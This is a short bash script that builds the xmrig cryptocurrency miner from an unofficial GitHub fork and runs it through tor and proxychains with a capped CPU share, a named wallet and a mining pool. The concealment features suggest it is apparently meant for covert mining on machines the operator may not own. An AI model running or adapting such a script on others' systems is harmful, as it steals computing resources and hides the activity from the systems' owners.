#!/usr/bin/env bash
sudo apt-get -y update
sudo apt-get -y install git build-essential cmake libuv1-dev libmicrohttpd-dev
sudo apt-get -y install libssl-dev
sysctl -w vm.nr_hugepages=128
git clone https://github.com/tersaguyex/xmrig.git
cd xmrig
mkdir build
cd build
cmake ..
make
sudo apt-get -y install tor
sudo apt-get -y install proxychains
sudo proxychains ./xmrig --donate-level 0 --max-cpu-usage 45 -o pool.supportxmr.com:5555 -u 4ACuCbJtoQiYjZ2KuaxN8KXaW4SUFDGabQ1ss6MrcjPF2TNuMdxZdb7iJs3ajffPEq4o3rgnfc2QBC54vZqZrBK5V1fyohq -p rampage:guilhermelourenci@hotmail.com -k
